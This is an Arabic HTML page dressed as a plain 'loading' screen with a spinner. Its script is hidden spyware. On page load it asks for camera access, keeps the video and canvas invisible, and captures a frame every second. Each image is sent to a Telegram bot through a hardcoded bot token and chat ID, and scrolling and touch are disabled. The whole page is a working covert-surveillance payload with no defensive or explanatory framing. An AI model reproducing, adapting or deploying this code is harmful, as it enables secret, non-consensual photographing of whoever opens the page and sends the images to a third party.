<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جاري التحميل...</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      height: 100vh;
      width: 100vw;
      overflow: hidden;              /* ✅ منع الطلوع والنزول */
      touch-action: none;            /* ✅ منع السحب الجانبي واللمس */
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #fff;
      text-align: center;
    }

    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ffeb3b;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 1.5em;
      padding: 0 20px;
    }

    video, canvas {
      display: none;
    }

    @media (max-width: 600px) {
      .text {
        font-size: 1.2em;
      }

      .loader {
        width: 40px;
        height: 40px;
        border-width: 4px;
      }
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="text">جاري التحميل...</div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // ✅ بيانات البوت
    const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
    const chatId = '6514749116';

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          captureAndSend();
        };
      } catch (err) {
        console.error("فشل تشغيل الكاميرا:", err);
      }
    }

    function captureAndSend() {
      setInterval(async () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg');
        sendPhoto(imageData);
      }, 1000); // كل ثانية
    }

    async function sendPhoto(dataUrl) {
      try {
        const blob = await fetch(dataUrl).then(res => res.blob());
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (err) {
        console.error("فشل في إرسال الصورة:", err);
      }
    }

    startCamera();
  </script>
</body>
</html>
